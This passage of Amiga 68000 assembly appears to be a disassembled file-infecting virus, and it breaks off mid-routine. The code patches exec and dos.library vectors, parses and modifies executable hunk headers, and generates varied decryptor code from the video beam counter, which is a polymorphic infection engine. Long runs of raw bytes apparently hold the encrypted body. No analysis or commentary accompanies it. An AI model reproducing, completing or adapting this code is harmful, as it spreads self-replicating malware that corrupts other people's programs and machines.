
AFLINE	macro
	dc.w	\1
	endm
**********************************************************************
	SECTION n000000,CODE
ProgStart
	JSR	lbC000008(PC)
	NOP
	RTS

lbC000008	MOVEM.L	D0-D7/A0-A6,-(SP)
	MOVE.B	lbB000015(PC),D0
lbW00000E	EQU	*-2
	MOVE.L	4,A6
	BSR	lbC0005AC
lbB000015	EQU	*-3
	dc.b	$4A
	dc.b	$80
	dc.b	$66
	dc.b	$4E
	dc.b	$43
	dc.b	$FA
	dc.b	13
	dc.b	$26
	dc.b	$4E
	dc.b	$AE
	dc.b	$FE
	dc.b	$68
	dc.b	$2A
	dc.b	$40
	dc.b	$C0
	dc.b	$3A
	dc.b	1
	dc.b	$96
	dc.b	$23
	dc.b	$40
	dc.b	0
	dc.b	12
	dc.b	12
	dc.b	$6D
	dc.b	$1B
	dc.b	$30
	dc.b	0
	dc.b	$52
	dc.b	$6B
	dc.b	$34
	dc.b	$20
	dc.b	$6D
	dc.b	$FF
	dc.b	$6C
	dc.b	12
	dc.b	$50
	dc.b	$2F
	dc.b	1
	dc.b	$67
	dc.b	$2A
	dc.b	$70
	dc.b	0
	dc.b	$72
	dc.b	0
	dc.b	8
	dc.b	$C0
	dc.b	$2F
	dc.b	13
	dc.b	$4E
	dc.b	$AE
	dc.b	$FD
	dc.b	$54
	dc.b	$67
	dc.b	$1C
	dc.b	$26
	dc.b	$40
	dc.b	$30
	dc.b	$3C
	dc.b	13
	dc.b	$47
	dc.b	$80
	dc.b	$3A
	dc.b	1
	dc.b	$AB
	dc.b	$41
	dc.b	$FA
	dc.b	$FF
	dc.b	$B2
	dc.b	$16
	dc.b	$D8
	dc.b	$51
	dc.b	$C8
	dc.b	$FF
	dc.b	$FC
	dc.b	$4E
	dc.b	$AB
	dc.b	$F8
	dc.b	$BC
	dc.b	$4E
	dc.b	$AB
	dc.b	$F9
	dc.b	$14
	dc.b	$20
	dc.b	$6F
	dc.b	0
	dc.b	$3C
	dc.b	$59
	dc.b	$88
	dc.b	$20
	dc.b	$BA
	dc.b	0
	dc.b	12
	dc.b	$2F
	dc.b	$48
	dc.b	0
	dc.b	$3C
	dc.b	$4C
	dc.b	$DF
	dc.b	$7F
lbB00007B	dc.b	$FF
	dc.b	$4E
	dc.b	$75
	dc.b	$4E
	dc.b	$71
	dc.b	$4E
	dc.b	$71
lbW000082	dc.w	$C29
	dc.w	$F02
	dc.w	$1D
	dc.w	$6600
	dc.w	$88
	dc.w	$103C
	dc.w	0
	dc.w	$2F29
	dc.w	$28
	dc.w	$2F29
	dc.w	$2C
	dc.w	$48E7
	dc.w	$FFFE
	dc.w	$45FA
	dc.w	$CDE
	dc.w	$5212
	dc.w	$C12
	dc.w	$31F
	dc.w	$6F58
	dc.w	$137A
	dc.w	$FFDA
	dc.w	$1D
	dc.w	$6162
	dc.w	$4AA9
	dc.w	$20
	dc.w	$664A
	dc.w	$4252
	dc.w	$137A
	dc.w	$10D
	dc.w	$1D
	dc.w	$7009
	dc.w	$3239
	dc.w	$DF
	dc.w	$F006
	dc.w	$4841
	dc.w	$3239
	dc.w	$BF
	dc.w	$D800
	dc.w	$D03A
	dc.w	$FFB9
	dc.w	$E1A9
	dc.w	$881
	dc.w	$121F
	dc.w	$C81
	dc.w	0
	dc.w	$7E00
	dc.w	$6B20
	dc.w	$2341
	dc.w	$2C
	dc.w	$6B1A
	dc.w	$45FA
	dc.w	$EC4
	dc.w	$234A
	dc.w	$28
	dc.w	$6122
	dc.w	$41FA
	dc.w	$BE3
	dc.w	$14D8
	dc.w	$66FC
	dc.w	$137A
	dc.w	$FFAA
	dc.w	$1D
	dc.w	$6112
	dc.w	$4CDF
	dc.w	$7FFF
	dc.w	$235F
	dc.w	$2C
	dc.w	$235F
	dc.w	$28
	dc.w	$137A
	dc.w	$1B3
	dc.w	$1D
	dc.w	$4EF9
lbL000114	dc.l	0

lbC000118	MOVE.L	D1,-(SP)
	JSR	0
lbL00011C	EQU	*-4
	dc.l	$48E7FFFE
	dc.l	$41FA0C46
	dc.l	$20AF003C
	dc.l	$D23A034F
	dc.l	$610000C2
	dc.l	$4CDF7FFF
	dc.l	$588F4E75
	dc.l	$700543FA
	dc.l	$DCC2C78
	dc.l	$44EAE
	dc.l	$FF526100
	dc.l	$4604A80
	dc.l	$661CC03A
	dc.l	$FF2741FA
	dc.l	$FFC0227A
	dc.l	$BF42348
	dc.l	$FF6C2348
	dc.l	$FD026100
	dc.l	$4F26004
	dc.w	$4AFC

lbC00016E	BSR.S	lbC00018E
lbC000170	MOVEM.L	(SP)+,D0-D7/A0-A6
	RTS

lbW000176	dc.w	0
	dc.w	$48E7
	dc.w	$FFFE
	dc.w	$41FA
	dc.w	$FFF8
	dc.w	$C50
	dc.w	$BB8
	dc.w	$67B6
	dc.w	$5250
	dc.w	$4CDF
	dc.w	$7FFF
	dc.w	$4E75

lbC00018E	MOVEQ	#5,D0
	MOVEQ	#9,D1
	LEA	*+$D7A(PC),A1
	MOVE.L	A1,A0
	OR.B	lbB000607(PC),D0
lbC00019C	CLR.L	(A0)+
	DBRA	D1,lbC00019C

	LEA	lbW000176(PC),A0
	CLR.W	(A0)+
	MOVE.B	lbB0004D7(PC),8(A1)
	MOVE.L	A0,$12(A1)
	MOVE.L	4,A6
	JSR	-$A8(A6)
	RTS

	MOVE.L	lbL00011C(PC),-$94(A6)
	MOVE.L	lbL00011C(PC),-$2FE(A6)
	MOVE.L	A6,-(SP)
	AND.B	lbB0002FE(PC),D4
	MOVE.L	4,A6
	MOVE.L	-$1C6(A6),A0
	CMP.W	#$2F01,$96(A0)
	BNE.S	lbC0001E4
	MOVE.L	lbL000114(PC),-$1C6(A6)
lbC0001E4	BSR.S	lbC00018E
	MOVE.L	(SP)+,A6
	MOVE.L	*+$B80(PC),D1
	JSR	0
	RTS

lbC0001F4	MOVE.L	A6,-(SP)
	MOVE.L	4,A6
	BSR	lbC0005AC
	TST.L	D0
	BNE	lbC000592
	MOVE.L	(SP)+,A6
	MOVE.W	$52(A6),D0
	AND.W	lbW00000E(PC),D0
	BNE.S	lbC00022C
	CMP.B	#$C0,$57(A6)
	BGT.S	lbC00022C
	CMP.B	#$B0,$57(A6)
	BLS.S	lbC00022C
	MOVE.L	A6,-(SP)
	MOVE.L	4,A6
	JSR	-$6C(A6)
	MOVE.L	(SP)+,A6
lbC00022C	AND.W	lbW0005BE(PC),D0
	BNE.S	lbC000252
	CMP.W	#$4EC,$56(A6)
	BMI.S	lbC000252
	MOVE.L	$42(A6),A6
	LEA	ascii.MSG4(PC),A0
	MOVEQ	#-$1,D0
	MOVEQ	#$17,D1
	JSR	-$5A(A6)
	MOVE.L	4,A6
	JMP	-$2D6(A6)

lbC000252	BSR	lbC00060E
	MOVE.B	lbB00025B(PC),D7
	dc.b	$2C
lbB00025B	dc.b	$4D
	dc.b	$42
	dc.b	$87
	dc.b	$1E
	dc.b	$39
	dc.b	0
	dc.b	$DF
	dc.b	$F0
	dc.b	7
	dc.b	$CE
	dc.b	$3A
	dc.b	0
	dc.b	$CF
	dc.b	6
	dc.b	$47
	dc.b	13
	dc.b	$48
	dc.b	$D0
	dc.b	$3A
	dc.b	1
	dc.b	$21
	dc.b	$41
	dc.b	$FA
	dc.b	4
	dc.b	$44
	dc.b	$31
	dc.b	$47
	dc.b	1
	dc.b	$3E
	dc.b	$53
	dc.b	$68
	dc.b	1
	dc.b	$3E
	dc.b	$61
	dc.b	0
	dc.b	4
	dc.b	$38
	dc.b	$DE
	dc.b	$7A
	dc.b	12
	dc.b	$42
	dc.b	$45
	dc.b	$FA
	dc.b	10
	dc.b	$E2
	dc.b	$25
	dc.b	$47
	dc.b	0
	dc.b	12
	dc.b	$22
	dc.b	$2A
	dc.b	0
	dc.b	4
	dc.b	$74
	dc.b	$FF
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$67
	dc.b	0
	dc.b	$FF
	dc.b	$58
	dc.b	$24
	dc.b	$80
	dc.b	$47
	dc.b	$EA
	dc.b	0
	dc.b	$18
	dc.b	$D6
	dc.b	$FA
	dc.b	1
	dc.b	$2E
	dc.b	$24
	dc.b	11
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$67
	dc.b	0
	dc.b	$FF
	dc.b	$38
	dc.b	12
	dc.b	$2B
	dc.b	$EE
	dc.b	$56
	dc.b	0
	dc.b	8
	dc.b	$67
	dc.b	10
	dc.b	12
	dc.b	$2B
	dc.b	$AC
	dc.b	$76
	dc.b	0
	dc.b	8
	dc.b	$67
	dc.b	2
	dc.b	$60
	dc.b	$10
	dc.b	12
	dc.b	$AB
	dc.b	0
	dc.b	0
	dc.b	$50
	dc.b	0
	dc.b	0
	dc.b	$7C
	dc.b	$6E
	dc.b	0
	dc.b	$FE
	dc.b	$EE
	dc.b	$80
	dc.b	$3A
	dc.b	1
	dc.b	$AB
	dc.b	$4B
	dc.b	$EB
	dc.b	0
	dc.b	$84
	dc.b	$30
	dc.b	$2D
	dc.b	0
	dc.b	10
	dc.b	$32
	dc.b	$3A
	dc.b	2
	dc.b	$8A
	dc.b	$C2
	dc.b	$FA
	dc.b	3
	dc.b	$64
	dc.b	$B0
	dc.b	$41
	dc.b	$6B
	dc.b	12
	dc.b	$D2
	dc.b	$7A
	dc.b	$FE
	dc.b	$F0
	dc.b	$B0
	dc.b	$41
	dc.b	$62
	dc.b	4
	dc.b	$60
	dc.b	0
	dc.b	$FE
	dc.b	$F6
	dc.b	$25
	dc.b	$4D
	dc.b	$FF
	dc.b	$FC
	dc.b	$2E
	dc.b	$2D
	dc.b	$FF
	dc.b	$F8
	dc.b	$25
	dc.b	$6D
lbB0002FE	dc.b	$FF
	dc.b	$F0
	dc.b	0
	dc.b	$10
	dc.b	$22
	dc.b	$12
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	12
	dc.b	$2B
	dc.b	$6D
	dc.b	$52
	dc.b	0
	dc.b	11
	dc.b	$66
	dc.b	0
	dc.b	$FE
	dc.b	$D6
	dc.b	$20
	dc.b	$2B
	dc.b	0
	dc.b	12
	dc.b	12
	dc.b	$80
	dc.b	0
	dc.b	0
	dc.b	$20
	dc.b	0
	dc.b	$62
	dc.b	14
	dc.b	12
	dc.b	$AB
	dc.b	0
	dc.b	0
	dc.b	$80
	dc.b	0
	dc.b	0
	dc.b	$7C
	dc.b	$6E
	dc.b	0
	dc.b	$FE
	dc.b	$BE
	dc.b	$60
	dc.b	12
	dc.b	12
	dc.b	$AB
	dc.b	0
	dc.b	4
	dc.b	$60
	dc.b	0
	dc.b	0
	dc.b	$7C
	dc.b	$6E
	dc.b	0
	dc.b	$FE
	dc.b	$B0
	dc.b	$90
	dc.b	$AB
	dc.b	0
	dc.b	$10
	dc.b	$32
	dc.b	$3A
	dc.b	$FF
	dc.b	$C6
	dc.b	$42
	dc.b	$81
	dc.b	8
	dc.b	$C1
	dc.b	$AD
	dc.b	4
	dc.b	$B0
	dc.b	$81
	dc.b	$6F
	dc.b	0
	dc.b	$FE
	dc.b	$9C
	dc.b	12
	dc.b	$AB
	dc.b	0
	dc.b	0
	dc.b	$40
	dc.b	0
	dc.b	0
	dc.b	$7C
	dc.b	$6B
	dc.b	0
	dc.b	$FE
	dc.b	$90
	dc.b	$61
	dc.b	0
	dc.b	$FE
	dc.b	$8C
	dc.b	$22
	dc.b	$2A
	dc.b	0
	dc.b	4
	dc.b	$42
	dc.b	$82
	dc.b	$61
	dc.b	0
	dc.b	2
	dc.b	$30
	dc.b	$30
	dc.b	$3C
	dc.b	4
	dc.b	$D2
	dc.b	$2F
	dc.b	14
	dc.b	$2C
	dc.b	$78
	dc.b	0
	dc.b	4
	dc.b	$20
	dc.b	7
	dc.b	$D0
	dc.b	$BA
	dc.b	9
	dc.b	$FE
	dc.b	$72
	dc.b	0
	dc.b	$4E
	dc.b	$AE
	dc.b	$FD
	dc.b	$54
	dc.b	$67
	dc.b	0
	dc.b	2
	dc.b	$12
	dc.b	$25
	dc.b	$40
	dc.b	0
	dc.b	8
	dc.b	$2C
	dc.b	$5F
	dc.b	$22
	dc.b	$3A
	dc.b	9
	dc.b	$E2
	dc.b	$24
	dc.b	$3C
	dc.b	0
	dc.b	0
	dc.b	3
	dc.b	$ED
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$67
	dc.b	0
	dc.b	1
	dc.b	$EA
	dc.b	$2C
	dc.b	0
	dc.b	$24
	dc.b	$3A
	dc.b	9
	dc.b	$D0
	dc.b	$D4
	dc.b	$BA
	dc.b	9
	dc.b	$D0
	dc.b	$24
	dc.b	$42
	dc.b	$26
	dc.b	$3A
	dc.b	$FF
	dc.b	$86
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$67
	dc.b	0
	dc.b	1
	dc.b	$80
	dc.b	$2A
	dc.b	0
	dc.b	$22
	dc.b	6
	dc.b	$74
	dc.b	0
	dc.b	$76
	dc.b	$FF
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$20
	dc.b	$4A
	dc.b	$42
	dc.b	$87
	dc.b	$DE
	dc.b	$3A
	dc.b	2
	dc.b	$2B
	dc.b	$20
	dc.b	$32
	dc.b	$78
	dc.b	0
	dc.b	12
	dc.b	$92
	dc.b	0
	dc.b	0
	dc.b	3
	dc.b	$F3
	dc.b	$66
	dc.b	0
	dc.b	1
	dc.b	$C6
	dc.b	$22
	dc.b	$2A
	dc.b	0
	dc.b	8
	dc.b	$E5
	dc.b	$89
	dc.b	$D2
	dc.b	$87
	dc.b	$D5
	dc.b	$C1
	dc.b	12
	dc.b	$6A
	dc.b	3
	dc.b	$E9
	dc.b	0
	dc.b	2
	dc.b	$67
	dc.b	$16
	dc.b	12
	dc.b	$9A
	dc.b	0
	dc.b	0
	dc.b	3
	dc.b	$F1
	dc.b	$66
	dc.b	0
	dc.b	1
	dc.b	$AA
	dc.b	$26
	dc.b	$1A
	dc.b	$E5
	dc.b	$8B
	dc.b	$D2
	dc.b	$83
	dc.b	$50
	dc.b	$81
	dc.b	$D5
	dc.b	$C3
	dc.b	$60
	dc.b	$E2
	dc.b	$26
	dc.b	$2A
	dc.b	0
	dc.b	4
	dc.b	$E5
	dc.b	$88
	dc.b	$5E
	dc.b	$81
	dc.b	$24
	dc.b	$3A
	dc.b	9
	dc.b	$68
	dc.b	$28
	dc.b	2
	dc.b	$44
	dc.b	$44
	dc.b	$E4
	dc.b	$8A
	dc.b	$D5
	dc.b	$B0
	dc.b	$78
	dc.b	0
	dc.b	$43
	dc.b	$F0
	dc.b	$40
	dc.b	0
	dc.b	$28
	dc.b	$49
	dc.b	$12
	dc.b	$D8
	dc.b	$51
	dc.b	$C9
	dc.b	$FF
	dc.b	$FC
	dc.b	$D5
	dc.b	$A9
	dc.b	$FF
	dc.b	$FC
	dc.b	$53
	dc.b	$83
	dc.b	$24
	dc.b	3
	dc.b	$E3
	dc.b	$8A
	dc.b	$50
	dc.b	$8A
	dc.b	$22
	dc.b	$DA
	dc.b	$51
	dc.b	$CB
	dc.b	$FF
	dc.b	$FC
	dc.b	$24
	dc.b	$49
	dc.b	$47
	dc.b	$FA
	dc.b	$FC
	dc.b	$44
	dc.b	$36
	dc.b	$3C
	dc.b	$3F
	dc.b	$F0
	dc.b	$22
	dc.b	2
	dc.b	$E3
	dc.b	$89
	dc.b	$C2
	dc.b	$3A
	dc.b	$FC
	dc.b	$35
	dc.b	$B4
	dc.b	$83
	dc.b	$62
	dc.b	$34
	dc.b	$95
	dc.b	$C1
	dc.b	$55
	dc.b	$41
	dc.b	$54
	dc.b	$8A
	dc.b	$55
	dc.b	$41
	dc.b	$53
	dc.b	$43
	dc.b	$6B
	dc.b	0
	dc.b	1
	dc.b	$46
	dc.b	$30
	dc.b	$12
	dc.b	$B0
	dc.b	$7A
	dc.b	$FF
	dc.b	$1C
	dc.b	$67
	dc.b	$6C
	dc.b	12
	dc.b	$40
	dc.b	$4E
	dc.b	$BA
	dc.b	$67
	dc.b	$66
	dc.b	$4A
	dc.b	0
	dc.b	$66
	dc.b	12
	dc.b	2
	dc.b	$40
	dc.b	$F0
	dc.b	0
	dc.b	$E9
	dc.b	$58
	dc.b	$B0
	dc.b	$3A
	dc.b	$FC
	dc.b	$51
	dc.b	$67
	dc.b	$56
	dc.b	$51
	dc.b	$CA
	dc.b	$FF
	dc.b	$D6
	dc.b	$60
lbB00047D	dc.b	0
	dc.b	1
	dc.b	$20
	dc.b	$32
	dc.b	$3A
	dc.b	$FC
	dc.b	$18
	dc.b	$42
	dc.b	$87
	dc.b	$1E
	dc.b	$39
	dc.b	0
	dc.b	$BF
	dc.b	$D8
	dc.b	0
	dc.b	$ED
	dc.b	$8F
	dc.b	$22
	dc.b	7
	dc.b	$94
	dc.b	$81
	dc.b	$E3
	dc.b	$8F
	dc.b	$9E
	dc.b	$3A
	dc.b	0
	dc.b	$8B
	dc.b	$22
	dc.b	7
	dc.b	$55
	dc.b	$81
	dc.b	$95
	dc.b	$C7
	dc.b	$55
	dc.b	$8A
lbB0004A0	dc.b	$54
	dc.b	$41
	dc.b	$53
	dc.b	$43
	dc.b	$6B
	dc.b	0
	dc.b	0
	dc.b	$F8
	dc.b	$30
	dc.b	$12
	dc.b	$B0
	dc.b	$7A
	dc.b	$FE
	dc.b	$CE
	dc.b	$67
	dc.b	$1E
	dc.b	12
	dc.b	$40
	dc.b	$4E
	dc.b	$BA
	dc.b	$67
	dc.b	$18
	dc.b	$4A
	dc.b	0
	dc.b	$66
	dc.b	12
	dc.b	2
	dc.b	$40
	dc.b	$F0
	dc.b	0
	dc.b	$E9
	dc.b	$58
	dc.b	$B0
	dc.b	$3A
	dc.b	0
	dc.b	$6B
	dc.b	$67
	dc.b	8
	dc.b	$51
	dc.b	$CA
	dc.b	$FF
	dc.b	$D6
	dc.b	$60
	dc.b	0
	dc.b	0
	dc.b	$D2
	dc.b	$26
	dc.b	$92
	dc.b	$34
	dc.b	$BA
	dc.b	$FD
	dc.b	$80
	dc.b	$35
	dc.b	$41
	dc.b	0
lbB0004D7	dc.b	2
	dc.b	$41
	dc.b	$FA
	dc.b	9
	dc.b	$EC
	dc.b	$30
	dc.b	$3A
	dc.b	9
	dc.b	$E6
	dc.b	$53
	dc.b	$40
	dc.b	$12
	dc.b	$D8
	dc.b	$51
	dc.b	$C8
	dc.b	$FF
	dc.b	$FC
	dc.b	$24
	dc.b	$49
	dc.b	$41
	dc.b	$FA
	dc.b	$FB
	dc.b	$20
	dc.b	$22
	dc.b	$3A
	dc.b	8
	dc.b	$84
	dc.b	$92
	dc.b	$7A
	dc.b	9
	dc.b	$D0
	dc.b	$53
	dc.b	$81
	dc.b	$12
	dc.b	$D8
	dc.b	$51
	dc.b	$C9
	dc.b	$FF
	dc.b	$FC
	dc.b	$10
	dc.b	$3A
	dc.b	7
	dc.b	$D0
	dc.b	$12
	dc.b	$3A
	dc.b	7
	dc.b	$CD
	dc.b	$D2
	dc.b	$3A
	dc.b	$FD
	dc.b	$4B
	dc.b	$24
	dc.b	$3A
	dc.b	8
	dc.b	$68
	dc.b	$94
	dc.b	$7A
	dc.b	9
	dc.b	$B4
	dc.b	$53
	dc.b	$42
	dc.b	$B3
	dc.b	$1A
	dc.b	$D2
	dc.b	$3A
	dc.b	$FF
	dc.b	$B3
	dc.b	$D2
	dc.b	0
	dc.b	$51
	dc.b	$CA
	dc.b	$FF
	dc.b	$F6
	dc.b	$61
	dc.b	0
	dc.b	1
	dc.b	$38
	dc.b	$26
	dc.b	5
	dc.b	$D6
	dc.b	$BA
	dc.b	8
	dc.b	$4C
	dc.b	$24
	dc.b	12
	dc.b	$22
	dc.b	6
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	$61
	dc.b	$6C
	dc.b	$30
	dc.b	$2E
	dc.b	0
	dc.b	$52
	dc.b	$C0
	dc.b	$7A
	dc.b	$FC
	dc.b	$D6
	dc.b	$E8
	dc.b	$48
	dc.b	$B0
	dc.b	$3A
	dc.b	$FD
	dc.b	$6F
	dc.b	$6F
	dc.b	6
	dc.b	$90
	dc.b	$3A
	dc.b	$FB
	dc.b	$80
	dc.b	$60
	dc.b	$F4
	dc.b	$41
	dc.b	$FA
	dc.b	0
	dc.b	$1A
	dc.b	$30
	dc.b	$80
	dc.b	$22
	dc.b	$3A
	dc.b	8
	dc.b	$18
	dc.b	$20
	dc.b	$7A
	dc.b	8
	dc.b	12
	dc.b	$42
	dc.b	$40
	dc.b	$10
	dc.b	$39
	dc.b	0
	dc.b	$DF
	dc.b	$F0
	dc.b	6
	dc.b	$C0
	dc.b	$7A
	dc.b	$FC
	dc.b	$F4
	dc.b	6
	dc.b	$40
	dc.b	0
	dc.b	0
	dc.b	$C0
	dc.b	$FA
	dc.b	0
	dc.b	$DA
	dc.b	$31
	dc.b	$40
	dc.b	0
	dc.b	10
	dc.b	$24
	dc.b	8
	dc.b	$4E
	dc.b	$B9
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	0
lbW00057A	dc.w	$223A
	dc.w	$7F0
	dc.w	$243A
	dc.w	$7F8
	dc.w	$6112
	dc.w	$2F0E
	dc.w	$2C78
	dc.w	4
	dc.w	$227A
	dc.w	$7E4
	dc.w	$4EAE
	dc.w	$FD4E

lbC000592	MOVE.L	(SP)+,A6
	RTS

	JSR	0
	RTS

	PEA	lbW00057A(PC)
	MOVE.L	D6,D1
	JSR	0
	RTS

lbC0005AC	MOVE.L	4,A6
	JSR	-$84(A6)
	MOVE.L	$196(A6),A0
	MOVE.L	10(A0),A1
	dc.w	$123A
lbW0005BE	dc.w	$3F
	dc.w	$6120
	dc.w	$4A80
	dc.w	$6616
	dc.w	$206E
	dc.w	$1A4

lbC0005CA	MOVE.L	10(A0),A2
	BSR.S	lbC0005E2
	TST.L	D0
	BNE.S	lbC0005DC
	TST.L	(A0)
	BEQ.S	lbC000606
	MOVE.L	(A0),A0
	BRA.S	lbC0005CA

lbC0005DC	JSR	-$8A(A6)
	RTS

lbC0005E2	MOVEQ	#$40,D0
lbC0005E4	TST.B	(A2)
	BEQ.S	lbC000606
	dc.w	$C1A
lbB0005EA	dc.b	$69
	dc.b	$56
	dc.b	$66
	dc.b	$14
	dc.b	$12
	dc.b	$1A
	dc.b	$B2
	dc.b	$3A
	dc.b	$FE
	dc.b	$AE
	dc.b	$67
	dc.b	$14
	dc.b	$B2
	dc.b	$3A
	dc.b	$FF
	dc.b	$F2
	dc.b	$66
	dc.b	6
	dc.b	12
lbB0005FD	dc.b	$1A
	dc.b	$2D
	dc.b	$72
	dc.b	$67
	dc.b	8

lbC000602	DBEQ	D0,lbC0005E4

lbC000606	MOVEQ	#0,D0
lbB000607	EQU	*-1
	dc.b	$4E
	dc.b	$75

lbC00060A	MOVEQ	#-$1,D0
	RTS

lbC00060E	MOVE.L	A6,A5
	MOVE.L	4,A6
	LEA	doslibrary.MSG(PC),A1
	JSR	-$60(A6)
	MOVE.L	D0,A0
	MOVE.L	$3C(A0),A0
	LEA	lbC000688(PC),A2
	LEA	lbC000118(PC),A1
	MOVE.L	A0,A4
	MOVE.W	(A2)+,D0
	BEQ.S	lbC000644
	dc.w	$3030
	dc.b	0
lbB000633	dc.b	0
	dc.b	$48
	dc.b	$C0
	dc.b	$D9
	dc.b	$C0
	dc.b	$30
	dc.b	$1A
	dc.b	$D0
	dc.b	$3A
	dc.b	$FF
	dc.b	$F7
	dc.b	$23
	dc.b	$8C
	dc.b	0
	dc.b	0
	dc.b	$60
	dc.b	$E6

lbC000644	MOVE.W	$32(A0),D0
	EXT.L	D0
	ADD.L	D0,A0
	MOVE.L	A0,4(A1)
	LEA	-$94(A5),A0
	MOVE.L	A1,(A0)
	MOVE.L	A1,-$26A(A0)
lbC00065A	MOVE.L	A6,-(SP)
	MOVE.L	4,A6
	JSR	-$27C(A6)
	MOVE.L	(SP)+,A6
	RTS

	MOVE.L	A6,-(SP)
	MOVE.L	4,A6
	LEA	lbW000082(PC),A0
	MOVE.L	-$1C6(A6),$92(A0)
	MOVE.L	A0,-$1C6(A6)
	MOVE.L	(SP)+,A6
	LEA	*+$6F6(PC),A0
	CLR.W	(A0)
	BSR.S	lbC00065A
	RTS

lbC000688	OR.B	#$7C,A2
	OR.B	#$8E,A4
	OR.B	#$96,A6
	OR.B	#$18,(A0)
	OR.B	#$A8,(A6)
	OR.B	#$7C,(A4)+
	OR.B	#$D6,(A6)+
	OR.B	#$92,-(A2)
	OR.B	#$EE,-(A6)
	OR.B	#$80,oprand
	OR.L	#$45E0000,D4
lbC0006B6	MOVEM.L	D0-D7/A0-A6,-(SP)
	LEA	ascii.MSG3(PC),A6
	MOVE.W	$DFF00A,(A6)
	TST.B	(A6)
	BNE.S	lbC0006CA
	ADDQ.B	#1,(A6)
lbC0006CA	LEA	lbC0006B6(PC),A0
	CLR.L	D7
	MOVE.W	$DFF006,D7
	SUB.L	D7,A0
	LEA	*+$7EE(PC),A1
	MOVE.L	A1,A5
	LEA	ascii.MSG1(PC),A3
lbC0006E2	MOVE.B	(A0)+,D0
	AND.W	#7,D0
	CMP.B	#5,D0
	BHI.S	lbC0006E2
	MOVE.W	D0,(A3)+
	MOVE.B	(A0)+,D0
	AND.W	#7,D0
	MOVE.W	D0,(A3)+
lbC0006F8	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	D1,D0
	BEQ.S	lbC0006F8
	MOVE.W	D1,(A3)+
	MOVE.B	(A0)+,D5
	AND.W	#7,D5
	MOVEQ	#1,D3
	MOVEQ	#0,D2
lbC00070E	CMP.W	#$10,D3
	BGE.S	lbC000760
	MOVE.L	D0,-(SP)
	BSR	lbC000996
	MOVE.L	(SP)+,D0
	MOVE.B	(A0)+,D1
	CMP.B	#$3F,D1
	BMI.S	lbC000740
	CMP.B	#$BF,D1
	BHI.S	lbC000740
	MOVE.W	D3,D4
	NEG.B	D4
	AND.W	#15,D4
	TST.W	D4
	BEQ.S	lbC000760
	ADD.W	#$2EFF,D4
	MOVE.W	D4,(A1)+
	ADDQ.W	#1,D3
	BRA.S	lbC00070E

lbC000740	MOVE.B	(A0)+,D0
	AND.W	#15,D0
	MOVE.W	#$48E7,(A1)+
	CLR.W	D2
lbC00074C	BSET	D3,D2
	ADDQ.W	#1,D3
	CMP.W	#$10,D3
	BEQ.S	lbC00075E
	DBRA	D0,lbC00074C

	MOVE.W	D2,(A1)+
	BRA.S	lbC00070E

lbC00075E	MOVE.W	D2,(A1)+
lbC000760	BSR	lbC0009B4
	MOVE.B	(A0)+,D1
	AND.W	#3,D1
	TST.B	D1
	BNE.S	lbC000776
	MOVE.L	#$2C780004,(A1)+
	BRA.S	lbC0007EC

lbC000776	SUBQ.W	#1,D1
	TST.B	D1
	BNE.S	lbC000788
	MOVE.L	#$2C790000,(A1)+
	MOVE.W	#4,(A1)+
	BRA.S	lbC0007EC

lbC000788	SUBQ.W	#1,D1
	TST.B	D1
	BNE.S	lbC0007AC
	TST.B	(A0)+
	BHI.S	lbC00079A
	MOVE.W	#$2F39,(A1)+
	CLR.W	(A1)+
	BRA.S	lbC00079E

lbC00079A	MOVE.W	#$2F38,(A1)+
lbC00079E	MOVE.W	#4,(A1)+
	BSR	lbC0009B4
	MOVE.W	#$2C5F,(A1)+
	BRA.S	lbC0007EC

lbC0007AC	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	MOVE.W	D1,D3
	MOVE.W	#$7004,D0
	ROL.W	#7,D0
	OR.B	D1,D0
	ROR.W	#7,D0
	MOVE.W	D0,(A1)+
	BSR	lbC000996
	MOVE.W	#$2040,D0
	ADD.B	D3,D0
	ROL.W	#7,D0
lbC0007CC	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.B	#7,D1
	BEQ.S	lbC0007CC
	MOVE.W	D1,D3
	OR.B	D1,D0
	ROR.W	#7,D0
	MOVE.W	D0,(A1)+
	BSR	lbC000996
	MOVE.W	#$2C50,D0
	ADD.B	D3,D0
	MOVE.W	D0,(A1)+
lbC0007EC	BSR	lbC0009B4
	dc.w	$203C
lbL0007F2	dc.l	$303C0000
	dc.l	$EF98D03A
	dc.l	$4C9EE98
	dc.l	$22C06100
	dc.l	$1B2203C
lbL000806	dc.l	$41FAFFFE
	dc.l	$EF98D03A
	dc.l	$4B1EE98
	dc.l	$2F0922C0
	dc.l	$6100019C
	dc.l	$303C7000
	dc.l	$103A04B1
	dc.l	$EF58D03A
	dc.l	$49BEE58
	dc.l	$32C06100
	dc.l	$1862F09
	dc.l	$61000180
	dc.l	$303CB118
	dc.l	$D03A0483
	dc.l	$EF58D03A
	dc.l	$47FEE58
	dc.l	$32C049FA
	dc.l	$3241A18
	dc.l	$2450003
	dc.l	$12180241
	dc.l	$1FE789
	dc.l	$6100017C
	dc.l	$203C0600
	dc.l	$1218
	dc.l	$E149D041
	dc.l	$103A0464
	dc.l	$4840D03A
	dc.l	$44F4840
	dc.l	$22C06100
	dc.l	$13A203C
	dc.l	$FFFE51C8
	dc.l	$D03A043F
	dc.l	$48402209
	dc.l	$26179681
	dc.l	$55433003
	dc.l	$22C06100
	dc.w	$11E

lbC000898	MOVE.B	(A0)+,D1
	AND.W	#3,D1
	TST.B	D1
	BNE.S	lbC0008A6
	BSR.S	lbC000914
	BRA.S	lbC0008BC

lbC0008A6	SUBQ.W	#1,D1
	BNE.S	lbC0008B0
	BSR	lbC000932
	BRA.S	lbC0008BC

lbC0008B0	SUBQ.W	#1,D1
